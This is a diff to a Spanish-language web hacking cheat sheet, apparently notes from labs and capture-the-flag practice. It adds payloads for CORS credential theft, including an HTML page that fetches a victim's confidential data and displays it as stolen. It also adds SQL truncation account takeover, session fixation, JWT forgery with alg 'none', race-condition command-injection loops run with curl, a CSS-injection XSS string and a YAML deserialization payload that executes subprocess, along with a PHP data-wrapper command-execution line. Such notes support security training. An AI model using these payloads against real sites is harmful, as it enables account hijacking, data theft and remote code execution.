@@ -398,7 +398,7 @@ Content-Length: 22
 GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCk7ID8%2b%Cg==&cmd=whoami
 ```
 
-> Espectacular tool que con un wrapper y encoding es capaz de ejecutar comandos, la salida del uso de l aherramienta es lo que debes copiar en el parámetro inyectable 
+> Espectacular tool que con un wrapper y encoding es capaz de ejecutar comandos, la salida del uso de la herramienta es lo que debes copiar en el parámetro inyectable 
 
 - [ChainGenerator](https://github.com/synacktiv/php_filter_chain_generator)
 ```bash
@@ -1372,6 +1372,8 @@ wfuzz -c -X POST --hc=404,400,403 -z range,1-2000 -d 'product_id=FUZZ' https://v
 
 ## CORS
 
+>Si envenenamos la cabecera **Origin:** la víctima que viste el sitio será sometida a lo que permita la web traer de dominios terceros
+
 - Las líneas **4 y 5** dicen que las credenciales entre sitios pueden viajar
 ```Response-HTTP
 1 HTTP/1.0 200 OK
@@ -1382,4 +1384,120 @@ wfuzz -c -X POST --hc=404,400,403 -z range,1-2000 -d 'product_id=FUZZ' https://v
 6 Vary: Origin, Cookie
 7 Server: Werkzeug/0.14.1 Python/3.6.9
 8 Date: Thu, 02 Mar 2023 12:10:07 GMT
+```
+- Examples
+```Burpsuite
+Origin: http://eploit.server
+Origin: null
+Origin: **
+```
+
+- Contenido de **/tumadre.js**
+```JS
+<script>
+ var req = new XMLHttpRequest();
+ req.onload = reqListener;
+ req.open('GET', 'http://localhost:5000/confidential', true);
+ req.withCredentials = true;
+ req.send();
+
+ function reqListener() {
+        document.getElementById("stolenInfo").innerHTML = req.responseText;
+ }
+</script>
+
+<br>
+<center><h1>Has sido hackeado, esta es la información que te he robado:</h1></center>
+<p id="stolenInfo"></p>
+```
+
+> Se supone que al ir a mi localhost/tumadre.html
+> la página se pintaba igual que lo que visitaba la víctima en /confidential
+
+- Si quiere pintarlo bonito sólo tienes que esperar a que  lleguen  peticiones d ela víctima con sus directorios y archivos
+
+## SQL Truncation
+
+-----
+>Lab Para Jugar: [Lab](https://www.vulnhub.com/entry/ia-tornado,639/)
+-----
+
+>En este ataque lo que hace la base de datos por detrás  en **/resgister-user** es borrar los espacios que pones en el username de un login y hacer la comprobación si el usuario existe, cabe destcar que estos logins tienen un **límite max-length** y nosotros lo excedermos con los espacios
+
+>Aunque de primeras como el usuario `user@user.com    aaa` no existe, le cambias la contraseña al usuario  user@user.com
+
+
+```LoginPanel
+# En el HTML modificar el max-length
+Login: user@user.com    aaa
+Password: telacambioprimo
+```
+
+Podemos poner **~**  al directorio de un usuario para ver si tiene un alias asignado en el backend
+
+```URL
+http://dominacoprimo.com/~usuario/
+```
+
+## Session Puzzling / Session Fixation / Session Variable Overloading
+
+>Una web en el **/forgot-password** te puede setear previamente una cookie y sin  estar autenticado puedes ver directorios que no deberías, **TENEMOS QUE PONER UN USER válido**
+
+### Session Fixation
+-  Le podemos pasar a una víctima una url con el valor de una cookie por GET y si está mal desarrolladola víctima la web le asignará esa cookie.
+`http://dominiochi.com/?Setcookie=123456asf`
+
+- Esto sirve para hacernos pasar por la víctima
+### Session Puzzling
+
+>Se refiere a hacer fuerza bruta en una cookie para intentar validarse como otro user
+
+### Session Variable Overloading
+
+> se refiere a un tipo específico de ataque de Session Fixation en el que el atacante envía una gran cantidad de datos a la aplicación web con el objetivo de sobrecargar las variables de sesión.
+
+## JWT
+
+- Pasar el algoritmo a "none" y quitarle la signature, ir cambiando el id para suplantar un user
+- Creamos nuestro  jwt a partir del jwt que nos da la web fijándonos en su estructura
+```bash
+echo -n '{"alg":"cadenadeJWT"}' | base64
+```
+
+- Podemos no cambiarle nada y jugar a averiguar el secreto, ir cambiando el id para suplantar un user
+## Race Condition
+
+>En este caso el backend posee una inyección de comandos, pero si en el parámetro de entrada le pones algo que no sea alfanumérico como \`id\`  borrará el fichero donde se redirigía el output de ese comando
+
+>En este periodo nos daría tiempo a leer el archivo
+
+>El secreto es la rapidez de peticiones y que de 2 peticione sa la vez el server le envíe el 
+>response a quién no debe
+
+- Lanzo el comando **id** en un bucle
+```bash
+while true; do curl -s X GET 'http://localhost:5000/?person=`id`&person=validate'; done
+```
+
+- Hago peticiones hasta que salga el comando
+```bash
+while true; do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "cadenas| quenoquiera| En el Response"; done
+heck this out: uid=0(root) gid=0(root) grupos=0(root)
+```
+
+## CSSI - Inyeccione sCSS
+
+>Si hay un parámetro que te cambia el color o forma del output, podemos enchufarle esto
+
+`color=beige}</laetiquetaquehayaquecerrar><script>alert("XSS")</script>`
+
+## Python Deserialization Yaml
+
+>**YAML:** formato de deserializacion de datos legible inspirado en formatos de correo.
+
+- [Sitio de payloads](https://www.pkmurphy.com.au/isityaml/)
+
+- SI vemos una cadena en **Base64 en la URL o en cualquier sitio**, la sustituimos por la que nos da abajo
+```bash
+echo -n "YAML: !!python/object/apply:subprocess.check_output ['ls']" | base64 -w 0 ; echo
 ```
